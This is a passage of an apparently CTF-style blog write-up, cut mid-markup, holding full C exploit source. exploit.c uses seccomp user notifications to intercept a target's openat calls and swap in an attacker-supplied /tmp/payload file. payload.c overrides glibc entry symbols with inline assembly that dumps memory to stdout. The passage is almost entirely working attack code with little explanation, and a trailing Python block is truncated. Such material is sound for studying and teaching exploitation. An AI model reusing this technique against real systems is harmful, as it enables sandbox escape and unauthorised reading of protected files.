class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// exploit.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg)    \</span><br><span class="hljs-meta">  do &#123;                  \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sendfd</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> fd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-type">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">recvfd</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-type">int</span> data, fd;<br>  <span class="hljs-type">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS) &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sigchldHandler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">seccomp</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> operation, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">void</span> *args)</span> &#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X32_SYSCALL_BIT 0x40000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-type">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">closeSocketPair</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>])</span> &#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pid_t</span> <span class="hljs-title function_">targetProcess</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-type">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">allocSeccompNotifBuffers</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seccomp_notif **req,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> seccomp_notif_resp **resp,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> seccomp_notif_sizes *sizes)</span> &#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>) errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-type">size_t</span> resp_size = sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  <span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>) errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">handleNotifications</span><span class="hljs-params">(<span class="hljs-type">int</span> notifyFd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-type">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR) <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat) &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>],req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">supervisor</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>])</span> &#123;<br>  <span class="hljs-type">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readBinary</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> sz,readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;sz);<br>  <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>,O_WRONLY|O_CREAT,<span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span>(sz &gt; <span class="hljs-number">0</span>)&#123;<br>    readed = read(<span class="hljs-number">0</span>,buf,sz);<br>    write(f,buf,readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// payload.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/unistd.h&gt;</span></span><br><br>__asm__(<span class="hljs-string">&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;</span>);<br>__asm__(<span class="hljs-string">&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.2.5&quot;</span>);<br>__asm__(<span class="hljs-string">&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;</span>);<br><br><br><span class="hljs-type">void</span> __libc_start_main_impl()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">puts_impl</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov qword ptr [rax],1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 